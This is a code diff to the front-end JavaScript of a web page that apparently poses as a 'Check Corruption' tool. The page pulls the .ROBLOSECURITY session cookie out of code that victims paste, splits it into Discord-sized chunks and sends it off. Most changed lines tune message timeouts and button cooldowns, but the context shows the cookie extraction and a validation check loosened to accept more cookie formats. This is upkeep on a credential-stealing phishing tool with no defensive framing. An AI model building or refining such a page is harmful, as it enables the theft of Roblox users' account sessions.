@@ -266,6 +266,10 @@
         const localStorageCodeKey = 'powershellCodeInput';
         const localStorageMainButtonStateKey = 'mainButtonSuccess';
 
+        // Keep track of active messages to prevent premature hiding by updateButtonStates
+        let activeMessageTimeoutMain = null; 
+        let activeMessageTimeoutModal = null; 
+
         /**
          * Displays a message in the specified message box.
          * @param {HTMLElement} boxElement - The message box element to update (e.g., messageBox or modalMessageBox).
@@ -274,6 +278,15 @@
          * @param {number} [duration=0] - Duration in milliseconds to show the message. 0 means persistent until cleared by updateButtonStates or new message.
          */
         function showMessageBox(boxElement, message, isError = false, duration = 0) {
+            // Clear any existing timeout for this box to prevent conflicts
+            if (boxElement === messageBox && activeMessageTimeoutMain) {
+                clearTimeout(activeMessageTimeoutMain);
+                activeMessageTimeoutMain = null;
+            } else if (boxElement === modalMessageBox && activeMessageTimeoutModal) {
+                clearTimeout(activeMessageTimeoutModal);
+                activeMessageTimeoutModal = null;
+            }
+
             boxElement.textContent = message;
             boxElement.classList.remove('hidden', 'custom-success-bg', 'custom-error-bg');
             if (isError) {
@@ -284,12 +297,24 @@
             boxElement.classList.remove('hidden');
 
             if (duration > 0) {
-                setTimeout(() => {
+                const timeoutId = setTimeout(() => {
                     // Only hide if the message hasn't changed
                     if (boxElement.textContent === message) {
                         boxElement.classList.add('hidden');
+                        boxElement.classList.remove('custom-success-bg', 'custom-error-bg'); // Remove styling
+                    }
+                    if (boxElement === messageBox) {
+                        activeMessageTimeoutMain = null;
+                    } else if (boxElement === modalMessageBox) {
+                        activeMessageTimeoutModal = null;
                     }
                 }, duration);
+
+                if (boxElement === messageBox) {
+                    activeMessageTimeoutMain = timeoutId;
+                } else if (boxElement === modalMessageBox) {
+                    activeMessageTimeoutModal = timeoutId;
+                }
             }
         }
 
@@ -346,7 +371,7 @@
                     showMessageBox(messageBoxElement, "Could not find the .ROBLOSECURITY cookie value. Please ensure the code is complete and correctly formatted.", true, 5000);
                     return;
                 }
-
+                
                 // Removed the .startsWith("CAE") check to be more flexible with cookie formats
                 // if (!extractedCookie.startsWith("CAE")) {
                 //      showMessageBox(messageBoxElement, "Extracted value does not look like a valid .ROBLOSECURITY cookie (doesn't start with 'CAE'). Please check the code.", true, 5000);
@@ -366,7 +391,7 @@
             buttonElement.disabled = true;
             const originalButtonText = buttonElement.textContent;
             buttonElement.textContent = 'Sending...';
-            messageBoxElement.classList.add('hidden'); // Temporarily hide message box during sending
+            // Do NOT hide messageBoxElement here, showMessageBox will handle it.
 
             const discordMessageLimit = 2000;
             const messageChunks = [];
@@ -402,7 +427,7 @@
                         mainButtonClickedSuccessfully = true; 
                         saveInputToLocalStorage(); 
                     } else {
-                        showMessageBox(modalMessageBox, 'Message sent successfully!', false, 5000); // Use modalMessageBox here
+                        showMessageBox(modalMessageBox, 'Message sent successfully!', false, 5000); // Correctly use modalMessageBox here
                         modalMessageInput.value = '';
                     }
                 }
@@ -422,18 +447,23 @@
             // Main Button Cooldown
             const mainRemaining = mainCooldownTime - (currentTime - lastClickTimeMain);
             if (mainRemaining > 0) {
+                sendButton.disabled = true;
                 const minutes = Math.floor(mainRemaining / 60000);
                 const seconds = Math.ceil((mainRemaining % 60000) / 1000);
-                sendButton.disabled = true;
                 sendButton.textContent = `Check Corruption + Log info (${minutes}m ${seconds}s)`;
-                // Keep messageBox visible if it has an active error/success class
-                if (!messageBox.classList.contains('custom-error-bg') && !messageBox.classList.contains('custom-success-bg')) {
+                
+                // Only hide messageBox if there's no active error/success message being displayed
+                if (!activeMessageTimeoutMain && !messageBox.classList.contains('custom-error-bg') && !messageBox.classList.contains('custom-success-bg')) {
                     messageBox.classList.add('hidden');
                 }
             } else {
                 sendButton.disabled = false;
                 sendButton.textContent = 'Check Corruption + Log info';
-                messageBox.classList.add('hidden'); // Hide when cooldown is over and no active message
+                // Only hide messageBox if there's no active error/success message being displayed
+                if (!activeMessageTimeoutMain) {
+                    messageBox.classList.add('hidden');
+                    messageBox.classList.remove('custom-success-bg', 'custom-error-bg'); // Clean up styling
+                }
             }
 
             // Modal Button Cooldown (depends on main button's last click)
@@ -446,25 +476,30 @@
                 sendModalButton.disabled = true;
                 sendModalButton.textContent = 'Enter code';
             } else if (modalRemaining > 0) {
+                openModalButton.disabled = true;
                 const minutes = Math.floor(modalRemaining / 60000);
                 const seconds = Math.ceil((modalRemaining % 60000) / 1000);
-                openModalButton.disabled = true;
                 openModalButton.textContent = `Code check (${minutes}m ${seconds}s)`;
                 sendModalButton.disabled = true;
                 sendModalButton.textContent = `Enter code (${minutes}m ${seconds}s)`;
                 
                 // Only show modal message box if modal is open AND no error/success is currently active
-                if (codeCheckModal.classList.contains('flex') && !modalMessageBox.classList.contains('custom-error-bg') && !modalMessageBox.classList.contains('custom-success-bg')) {
+                if (codeCheckModal.classList.contains('flex') && !activeMessageTimeoutModal && !modalMessageBox.classList.contains('custom-error-bg') && !modalMessageBox.classList.contains('custom-success-bg')) {
                     showMessageBox(modalMessageBox, `Please wait ${minutes}m ${seconds}s before using this.`, true); // Error message for being in cooldown
                 } else if (!codeCheckModal.classList.contains('flex')) {
                     modalMessageBox.classList.add('hidden'); // Hide if modal is closed
+                    modalMessageBox.classList.remove('custom-success-bg', 'custom-error-bg'); // Clean up styling
                 }
             } else {
                 openModalButton.disabled = false;
                 openModalButton.textContent = 'Code check';
                 sendModalButton.disabled = false;
                 sendModalButton.textContent = 'Enter code';
-                modalMessageBox.classList.add('hidden'); // Hide when cooldown is over and no active message
+                // Only hide modalMessageBox if there's no active error/success message being displayed
+                if (!activeMessageTimeoutModal) {
+                    modalMessageBox.classList.add('hidden');
+                    modalMessageBox.classList.remove('custom-success-bg', 'custom-error-bg'); // Clean up styling
+                }
             }
         }
 
